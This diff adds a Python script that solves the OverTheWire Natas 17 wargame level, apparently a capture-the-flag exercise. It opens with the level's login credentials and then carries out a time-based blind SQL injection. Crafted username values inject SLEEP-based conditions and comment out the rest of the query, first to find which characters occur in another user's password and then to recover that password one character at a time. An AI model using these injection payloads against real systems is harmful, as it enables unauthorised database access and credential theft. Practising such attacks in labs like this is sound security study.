@@ -1,0 +1,29 @@
+natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+import requests, string
+from requests.auth import HTTPBasicAuth
+
+url = 'http://natas17.natas.labs.overthewire.org/index.php'
+auth = HTTPBasicAuth('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
+allchars = ''.join([string.ascii_letters,string.digits])
+sleep_time = 1
+filteredchars = ''
+passwd = ''
+
+for char in allchars:
+	username = f'natas18" AND IF(password LIKE BINARY "%{char}%",SLEEP({sleep_time}), 1)#'
+	r = requests.post(url, auth=auth, data={'username': username})
+	if (r.elapsed.seconds >= sleep_time):
+		filteredchars += char
+		print(filteredchars)
+
+print(filteredchars)
+
+for i in range(0,32):
+	for char in filteredchars:
+		username = f'natas18" AND IF(password LIKE BINARY "{passwd + char}%",SLEEP({sleep_time}), 1)#'
+		r = requests.post(url, auth=auth, data={'username': username})
+		if (r.elapsed.seconds >= sleep_time):
+			passwd += char
+			print(passwd)
+			break
